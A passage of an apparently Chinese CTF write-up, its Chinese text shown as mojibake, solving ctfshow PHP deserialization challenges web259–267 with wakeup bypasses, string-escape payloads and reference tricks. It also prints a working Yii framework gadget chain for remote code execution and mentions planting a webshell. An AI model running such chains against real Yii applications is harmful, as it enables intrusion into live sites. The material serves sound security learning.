alt="image-20230105183531826"></p><p>æ‰§è¡ŒæˆåŠŸã€‚</p><p>å› ä¸ºé¢˜ç›®çš„æœåŠ¡å™¨ç«¯å£æ˜¯80ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—æŠŠ9999ç»™å»æ‰ã€‚</p><p><img src="../images/image-20230105184013157.png" alt="image-20230105184013157"></p><p><img src="../images/image-20230105184100591.png" alt="image-20230105184100591"></p><p>æ‹¿åˆ°ç¼–ç çš„ä¸œè¥¿åè¿›è¡Œä¼ å‚ã€‚</p><p>ç„¶åè®¿é—®flag.txtå°±è¡Œäº†ã€‚</p><p>è¿™é“é¢˜ä¸»è¦å°±æ˜¯é€šè¿‡uaæ¥æ„é€ httpå¤´æ¥ç»•è¿‡æ£€æµ‹ã€‚</p><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>æºç </p><p><img src="../images/image-20230105174655881.png" alt="image-20230105174655881"></p><p>è¿™ä¸ªç‚¹å°±è€ƒå¯Ÿserializeï¼Œåªè¦ä¼ çš„ä¹‹é‡Œé¢æœ‰<code>ctfshow_i_love_36D</code>å°±è¡Œäº†ã€‚</p><p><img src="../images/image-20230105174843961.png" alt="image-20230105174843961"></p><p>åºåˆ—åŒ–åçš„ç»“æœã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p>æºç </p><p><img src="../images/image-20230105175010366.png" alt="image-20230105175010366"></p><p>è¿™é‡Œè¾¹ç”¨çš„å…¨æ˜¯é­”æœ¯æ–¹æ³•</p><p>php7.4ç‰ˆæœ¬ä»¥ä¸Šçš„è¯è¿™é‡Œé¢çš„è¯å¦‚æœæœ‰__unserialize()é­”æœ¯æ–¹æ³•çš„è¯ï¼Œä¼šè‡ªåŠ¨ç»•è¿‡ ,wakeup()é­”æœ¯æ–¹æ³•ï¼Œphp5.6ç‰ˆæœ¬ä»¥ä¸‹çš„è¯ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ç±»é‡Œè¾¹çš„å‚æ•°çš„æ•°é‡æ¥ç»•è¿‡wakeupæ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;   <span class="comment">//å¯¹è±¡åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123; <span class="comment">//ä½¿ç”¨serializeæ—¶è§¦å‘</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; <span class="comment">//æ£€æŸ¥æ˜¯å¦å­˜åœ¨å…·æœ‰åä¸º __unserialize() çš„é­”æœ¯æ–¹æ³•ã€‚æ­¤å‡½æ•°å°†ä¼šä¼ é€’ä» __serialize() è¿”å›çš„æ¢å¤æ•°ç»„ã€‚ç„¶åå®ƒå¯ä»¥æ ¹æ®éœ€è¦ä»è¯¥æ•°ç»„ä¸­æ¢å¤å¯¹è±¡çš„å±æ€§ã€‚</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p><img src="../images/image-20230105211617857.png" alt="image-20230105211617857"></p><p>é‚£ä¹ˆè¿™é“é¢˜çš„è¯ï¼Œåªéœ€è¦ç”¨ä¸¤ä¸ªé­”æ³•å‡½æ•°å°±è¡Œäº†ï¼Œè¿™é‡Œè¾¹çš„wakeupå‡½æ•°ä¸ç”¨ç®¡äº†ï¼Œå› ä¸ºå°±æ˜¯é¢˜ç›®çš„phpç‰ˆæœ¬æ˜¯7.4ä»¥ä¸Šçš„ã€‚invoke()å‡½æ•°ä¹Ÿä¸ç”¨ç®¡äº†ï¼Œå› ä¸ºå°±æ˜¯æ²¡æœ‰è§¦å‘çš„ç‚¹.ç°åœ¨å°±æ˜¯çœ‹sleepå‡½æ•°äº†ï¼Œåœ¨serializeæ—¶å°±ä¼šè§¦å‘ï¼Œç»™usernameå’Œpasswordç»™èµ‹å€¼äº†ã€‚unserializeå‡½æ•°ä¼šä¼ é€’ä» __serialize() è¿”å›çš„æ¢å¤æ•°ç»„ï¼Œé‚£ä¹ˆåˆä¼šç»™usernameå’Œpasswordé‡æ–°èµ‹å€¼äº†ã€‚å› ä¸ºcodeè¿™é‡Œæ—¶å¼±ç±»å‹æ¯”è¾ƒï¼Œç›´æ¥877.xxxxxxxxå°±å¯ä»¥ç»•è¿‡äº†ã€‚</p><p>ç„¶åå»è®¿é—®877.phpå»è¿›è¡Œrceå°±è¡Œäº†ã€‚</p><h2 id="web262-å­—ç¬¦é€ƒé€¸"><a href="#web262-å­—ç¬¦é€ƒé€¸" class="headerlink" title="web262(å­—ç¬¦é€ƒé€¸)"></a>web262(å­—ç¬¦é€ƒé€¸)</h2><p>æºç </p><p><img src="../images/image-20230105212728740.png" alt="image-20230105212728740"></p><p>å…ˆè§£é‡Šä¸€ä¸‹å•¥æ—¶å­—ç¬¦é€ƒé€¸</p><p><strong>é€ƒé€¸æœ‰ä¸€ä¸ªç‰¹å¾å°±æ˜¯å¯¹åºåˆ—åŒ–åçš„å­—ç¬¦è¿›è¡Œä¸€ä¸ªæ›¿æ¢</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;vip=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$u_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="variable">$us</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$u_seri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$us</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230105222856799.png" alt="image-20230105222856799"></p><p><strong>è¿™é‡Œçš„è¯å°±ä¼šå‡ºç°hackerçš„é•¿åº¦ä¸º5ï¼Œé‚£ä¹ˆrå°±é€ƒé€¸å‡ºå»äº†ã€‚</strong></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æƒ³åŠæ³•æŠŠvipå˜æˆ1.</p><p><img src="../images/image-20230105223446392.png" alt="image-20230105223446392"></p><p>é‚£æˆ‘ä»¬è¦æŠŠvipå˜æˆ1ï¼Œä¸”èƒ½è¿›è¡Œé€ƒé€¸çš„è¯ï¼Œçº¢çº¿çš„â€â€å†…çš„å€¼è¦å’Œå¤–é¢çš„é•¿åº¦ç›¸ç­‰å°±èƒ½è¿›è¡Œé€ƒé€¸äº†ã€‚</p><p><img src="../images/image-20230105223548683.png" alt="image-20230105223548683"></p><p>å› ä¸ºæˆ‘ä»¬çš„payloadçš„é•¿åº¦æ—¶45,é‚£ä¹ˆæˆ‘ä»¬å°±å¾—ç”¨45ä¸ªadminæ¥æ›¿æ¢ã€‚å› ä¸ºæˆ‘ä»¬çš„adminå’Œhackerç›¸å·®ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆ45ä¸ªå­—ç¬¦çš„è¯ï¼Œå°±å¯ä»¥æŠŠä¸Šå›¾é€‰ä¸­çš„payloadç»™ä»£æ›¿æ‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿å…¶å’Œå¼•å·é‡Œçš„å€¼å’Œå¤–é¢çš„å­—ç¬¦é•¿åº¦ä¸€æ ·äº†   â€”&gt;  s:2:â€xxâ€   å°±æ˜¯ç±»ä¼¼è¿™ç§ã€‚</p><p><img src="../images/image-20230105224157993.png" alt="image-20230105224157993"></p><p>åˆšå¥½ç­‰äº270ï¼Œé€ƒé€¸æˆåŠŸï¼Œvipä¹ŸæˆåŠŸå†™å…¥ï¼Œå½“ç„¶äº†å°±æ˜¯åªçœ‹{}é‡Œé¢çš„å†…å®¹ï¼Œè¶…å‡ºä¹‹åçš„ä¸œè¥¿ç³»ç»Ÿä¸ç®¡äº†ã€‚</p><p>è®²æ˜ç™½é€ƒé€¸ä¹‹åï¼Œå›åˆ°æœ¬é¢˜ã€‚</p><p><img src="../images/image-20230105225632889.png" alt="image-20230105225632889"></p><p>æˆåŠŸé€ƒé€¸æœ‰ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå°±è·Ÿä¸Šé¢è®²è§£çš„é€ƒé€¸çš„æ­¥éª¤ä¸€æ­¥ä¸€æ­¥æ¥å°±å¯ä»¥è§£å‡ºæ¥äº†ã€‚</p><p><img src="../images/image-20230105225924163.png" alt="image-20230105225924163"></p><p>payloadä¸€å…±æœ‰62ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å»å†™62ä¸ªfuckäº†ï¼Œè¿™é‡Œä¸çŸ¥é“åŸå› çš„å¯ä»¥å»ä¸Šé¢çœ‹æˆ‘å†™çš„è§£é‡Šã€‚</p><p><img src="../images/image-20230105230112556.png" alt="image-20230105230112556"></p><p>åˆšåˆšå¥½ç›¸ç­‰ï¼Œç„¶åè¿›è¡Œbase64ç¼–ç åæ‹¿å»æäº¤ã€‚å°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><p><img src="../images/image-20230105230520473.png" alt="image-20230105230520473"></p><p><strong>è§£æ³•äºŒ</strong></p><p><img src="../images/image-20230105230809582.png" alt="image-20230105230809582"></p><p>ä¿®æ”¹ä¸€ä¸‹tokenç›´æ¥å°±å¯ä»¥è¿›è¡Œååºåˆ—äº†ã€‚</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>))));</span><br></pre></td></tr></table></figure><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>æºç </p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p>æºç </p><p><img src="../images/image-20230106132930372.png" alt="image-20230106132930372"></p><p>message.php</p><p><img src="../images/image-20230106132950692.png" alt="image-20230106132950692"></p><p>è¿™é“é¢˜è¿˜æ˜¯å¯ä»¥è¿›è¡Œå­—ç¬¦é€ƒé€¸ï¼Œåªè¦è¿›è¡Œåºåˆ—åŒ–è¾“å‡ºå°±è¡Œäº†ï¼Œå› ä¸ºå°±æ˜¯åœ¨index.phpé¡µé¢çš„æ—¶å€™å·²ç»ä¼šå°†åºåˆ—åŒ–çš„å€¼è¿›è¡Œbase64ç¼–ç äº†ï¼Œåœ¨message.phpé¡µé¢ä¼šåªæœ‰ä»£ç è¿›è¡Œbase64è§£ç å’Œååºåˆ—åŒ–ã€‚</p><p><img src="../images/image-20230106134745018.png" alt="image-20230106134745018"></p><p><img src="../images/image-20230106134810726.png" alt="image-20230106134810726"></p><p>é‚£ä¹ˆç›´æ¥è¿›è¡Œå­—ç¬¦é€ƒé€¸å°±è¡Œäº†ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†å†™äº†ï¼Œå› ä¸º<strong>web261</strong>å·²ç»è¯¦ç»†å†™è¿‡äº†ã€‚</p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><p>æºç </p><p><img src="../images/image-20230106140404379.png" alt="image-20230106140404379"></p><p>è¿™é‡Œå› ä¸ºtokenæ˜¯ä¸€ä¸ªmd5()éšæœºæ•°ï¼Œæ˜¯ä¸å¯æ§çš„ï¼Œé‚£ä¹ˆå¯æ§çš„åªæœ‰passwordï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—ç”¨åˆ°&amp;ï¼Œ</p><p><strong>åœ¨PHP ä¸­å¼•ç”¨çš„æ„æ€æ˜¯ï¼šä¸åŒçš„åå­—è®¿é—®åŒä¸€ä¸ªå˜é‡å†…å®¹ã€‚</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæ¥ä½¿passwordçš„å€¼æ’ç­‰äºtokençš„å€¼ã€‚</p><p><strong>paylaod</strong></p><p><img src="../images/image-20230106141939242.png" alt="image-20230106141939242"></p><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><p>æºç </p><p><img src="../images/image-20230106142948441.png" alt="image-20230106142948441"></p><p>è¿™é‡Œé¢å¤šäº†ä¸ª__toString()å‡½æ•°ã€‚</p><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å¦‚æœå®ä¾‹åŒ–ä¸€ä¸ªç±»çš„è¯ï¼Œå¹¶å°†è¿™ä¸ªå¯¹è±¡è¿›è¡Œè¾“å‡ºçš„è¯ï¼Œå°±æ˜¯è°ƒç”¨toStringå‡½æ•°ï¼Œæ²¡æœ‰çš„è¯å°±ä¼šæŠ¥é”™ã€‚</p><p>ï¼ˆå¦‚æœååºåˆ—åçš„å­—ç¬¦ä¸²ä¸­å«æœ‰ctfshowçš„è¯ï¼Œå°†ä¸ä¼šè¿›è¡Œ__destruct()å‡½æ•°çš„è°ƒç”¨ã€‚</p><p>å› ä¸ºè¿™é‡Œçš„è¯ï¼Œæœ€åçš„æ­£åˆ™åˆ¤æ–­æ˜¯ä¸èƒ½æœ‰ctfshowè¿™ä¸ªè¯ï¼Œä½†æ˜¯æ²¡æœ‰  /i  , å¯ä»¥åˆ©ç”¨å¤§å†™ç»•è¿‡ã€‚</p><p><strong>payload</strong></p><p><img src="../images/image-20230106145043122.png" alt="image-20230106145043122"></p><p>ä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥å†™åœ¨postçš„åŸå› æ˜¯</p><p><img src="../images/image-20230106145110445.png" alt="image-20230106145110445"></p><p>php://inputä¼ªåè®®çš„ä½œç”¨ã€‚</p><p><strong>è§£æ³•äºŒ</strong></p><p><img src="../images/image-20230106145214649.png" alt="image-20230106145214649"></p><p>ç±»åä¸å˜ï¼Œä½†æ˜¯ä¸èƒ½æ­£å¸¸æ‰§è¡Œååºåˆ—åŒ–ï¼Œå› ä¸º{}é‡Œé¢çš„ä¸œè¥¿ä¸å¯¹ï¼Œé‚£ä¹ˆç›´æ¥å°±è¿›è¡Œé”€æ¯ï¼Œæ‰§è¡Œææ„å‡½æ•°äº†ã€‚</p><h2 id="web267-yii"><a href="#web267-yii" class="headerlink" title="web267(yii)"></a>web267(yii)</h2><p>æºç </p><p><img src="../images/image-20230107205741775.png" alt="image-20230107205741775"></p><p><img src="../images/image-20230107205924759.png" alt="image-20230107205924759"></p><p>ç™»å½•æ¡†æ¶æ˜¯yiiçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰¾ä¸€ä¸‹è¿™ä¸ªæ¡†æ¶çš„æ¼æ´ã€‚</p><p><img src="../images/image-20230107210119947.png" alt="image-20230107210119947"></p><p>åˆ©ç”¨admin/adminç™»å½•æˆåŠŸåï¼ŒæŸ¥çœ‹aboutè¿™é‡Œçš„æºç ï¼Œå‘ç°è¿™ä¸ªæ³¨é‡Šã€‚</p><p><img src="../images/image-20230107210335018.png" alt="image-20230107210335018"></p><p>è¾“å…¥view-sourceåå‡ºç°è¿™ä¸ªã€‚</p><p>ç„¶åå°±æ‰¾ä¸ªyiiåˆ©ç”¨é“¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé“¾æ˜¯æ‰§è¡Œphpinfo()çš„ï¼Œå¯ä»¥åœ¨__constructå‡½æ•°é‡Œè¾¹ä¿®æ”¹æ‰§è¡Œå‘½ä»¤ã€‚</p><p><img src="../images/image-20230107210926680.png" alt="image-20230107210926680"></p><p>å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œè¯´æ˜é“¾è¡¨å¯è¡Œã€‚</p><p>ç„¶åå°±ä¿®æ”¹æ‰§è¡Œå‘½ä»¤</p><p><img src="../images/image-20230107211023372.png" alt="image-20230107211023372"></p><p>è¿™é‡Œæœ‰ä¸ªå°é—®é¢˜å°±æ˜¯systemæ˜¯æ— å›æ˜¾çš„ï¼Œé‚£ä¹ˆå¯ä»¥å†™é©¬æˆ–è€…åˆ©ç”¨åˆ«çš„å‡½æ•°æ¥è§£ã€‚</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title 